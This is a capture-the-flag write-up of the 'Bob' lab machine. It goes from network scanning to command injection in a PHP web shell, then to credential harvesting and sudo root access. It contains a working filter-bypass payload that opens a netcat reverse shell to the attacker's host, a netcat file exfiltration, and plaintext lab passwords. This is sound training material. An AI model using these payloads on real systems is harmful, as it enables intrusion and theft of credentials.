**Author:** c0rruptedb1t

**Operating System:** Linux

**Aim:** To get the flag in /.

## Information Gathering
### Host Discovery

I proceeded to detect the target host on the local network.

```bash
root@kali:~$ netdiscover -i vmnet1 -r 192.168.179.1/24          
 Currently scanning: Finished!   |   Screen View: Unique Hosts           
                                                                  
 4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname

 192.168.179.153 00:0c:29:0e:b0:d2      3     180  VMware, Inc.         
 192.168.179.254 00:50:56:e0:d4:3f      1      42  VMware, Inc.
```

### Port Scanning

I did a full TCP port scan with nmap to discover available ports.

```bash
root@kali:~$ nmap -p- -v -T5 192.168.179.153 -oG nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
80/tcp    open  http
25468/tcp open  unknown
```

### Service Enumeration

Then I discovered the version of the services, OS detection , script scanning and traceroute on the target.

```bash
root@kali:~$ nmap -n -v -A -p80,25468 192.168.179.153 -oN nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION                                      
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))           
| http-methods:                                                          
|_  Supported Methods: OPTIONS HEAD GET POST

|_  256 39:16:56:fb:4e:0f:50:85:40:d3:53:22:41:43:38:15 (ED25519)
```


### Web Enumeration

Interacting with the web service I discovered a web site under construction.

![](/assets/images/bob1/screenshot-1.png)

If we notice in the nmap scan the robots.txt file was found which contains some web files especially one called **dev_shell.php** that looks interesting.

![](/assets/images/bob1/screenshot-2.png)

As we see this allows us executing some system commands but the cat command is not allowed, whit the following command I listed the sorce code of the dev_shell.php file.

```bash
more dev_shell.php
```

![](/assets/images/bob1/screenshot-3.png)

![](/assets/images/bob1/screenshot-4.png)

Analyzing the source code we see an array of commands not allowed, then the strpos() function returns a message if exists a semicolon in the string, if not the explode() function breaks the string into an array, then into the if statement checks only the first position of the array for bad commands, these restrictions allow the attacker execute system commands.

## Exploitation
### Command Injection

First we need set up a netcat listener, then execute the following netcat command to get a reverse shell.

```bash
whoami&&nc 192.168.179.1 443 -e /bin/bash
```
![](/assets/images/bob1/screenshot-5.png)

Then I update it for a full TTY shell.

```bash
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.153] 32884
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),100(users)
script -qc /bin/bash /dev/null
www-data@Milburg-High:/var/www/html$ ^Z
zsh: suspended  nc -vlnp 443
root@kali:~$ stty raw -echo;fg
[1]  + continued  nc -vlnp 443

www-data@Milburg-High:/var/www/html$ export TERM=xterm-256color
www-data@Milburg-High:/var/www/html$ export SHELL=/bin/bash
www-data@Milburg-High:/var/www/html$ stty rows 39 columns 164
```

In elliot's home directory I found a file with contains his password **theadminisdumb** and that of james **Qwerty**.

```bash
www-data@Milburg-High:/home/elliot$ cat theadminisdumb.txt 
The admin is dumb,
In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same for his friend James who doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of time before it’s broken into so because of this I have changed my password to

theadminisdumb

I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.
```

In bob's home directory, in hidden file, I found the password for users jc and seb.

```bash
www-data@Milburg-High:/home/bob$ cat .old_passwordfile.html 

<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>
```

In bob's Documents directory I found three resources.

```bash
www-data@Milburg-High:/home/bob/Documents$ ls
Secret  login.txt.gpg  staff.txt
```

Then I Transfer the login.txt.gpg file to the attacking machine which looks interesting.

```bash
www-data@Milburg-High:/home/bob/Documents$ nc -vlnp 8080 < login.txt.gpg 
listening on [any] 8080 ...
connect to [192.168.179.153] from (UNKNOWN) [192.168.179.1] 59366


root@kali:~$ nc 192.168.179.153 8080 > login.txt.gpg
```

Inside the secret directory I found a script with notes, as we can see, the first letters vertically say **HARPOCRATES**, this looks like a potential password.

```bash
www-data@Milburg-High:/home/bob/Documents$ cat Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh 
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
```

Then I decrypted the login.txt.gpg file with the password: **HARPOCRATES**.

```bash
root@kali:~$ gpg --passphrase HARPOCRATES --decrypt login.txt.gpg
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
bob:b0bcat_
```

Now we have the bob's password, I switch to the user Bob, this belongs to the sudoers group so he's allowed to execute any command as root.

```bash
bob@Milburg-High:~/Documents$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)
bob@Milburg-High:~/Documents$ sudo -l
sudo: unable to resolve host Milburg-High: Connection timed out
[sudo] password for bob: 
Matching Defaults entries for bob on Milburg-High:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bob may run the following commands on Milburg-High:
    (ALL : ALL) ALL
```

## Privilege Escalation
### Sudo Permissions

To get root we simply execute the su command as sudo, to read the flag the cat binary isn't working, so I used the more command.

```bash
bob@Milburg-High:~/Documents$ sudo su -
sudo: unable to resolve host Milburg-High: Connection timed out
root@Milburg-High:~# whoami
root
root@Milburg-High:~# cat /flag.txt 
hey n there /flag.txt
root@Milburg-High:~# more /flag.txt 
CONGRATS ON GAINING ROOT
